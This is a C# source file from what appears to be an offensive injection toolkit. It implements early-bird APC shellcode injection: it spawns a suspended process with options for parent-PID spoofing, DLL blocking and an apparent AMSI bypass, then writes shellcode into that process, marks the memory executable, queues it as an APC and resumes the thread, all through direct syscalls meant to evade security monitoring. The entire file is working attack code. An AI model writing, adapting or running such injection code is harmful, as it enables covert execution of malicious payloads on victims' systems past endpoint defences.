using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class RemoteThreadAPC
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false, bool debug = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls,
                am51: am51);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory (shellcode)

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory, shellcode");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtOpenThread

            IntPtr hThread = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };

            ntstatus = Syscalls.NtOpenThread(
                ref hThread,
                DI.Data.Win32.Kernel32.ThreadAccess.SetContext,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");

            #endregion

            #region NtQueueApcThread

            ntstatus = Syscalls.NtQueueApcThread(
                hThread,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");

            #endregion

            #region NtAlertResumeThread

            uint suspendCount = 0;

            ntstatus = Syscalls.NtAlertResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
            else
                throw new Exception($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");

            #endregion

            Syscalls.NtClose(hThread);
            Syscalls.NtClose(hProcess);
        }
    }
}
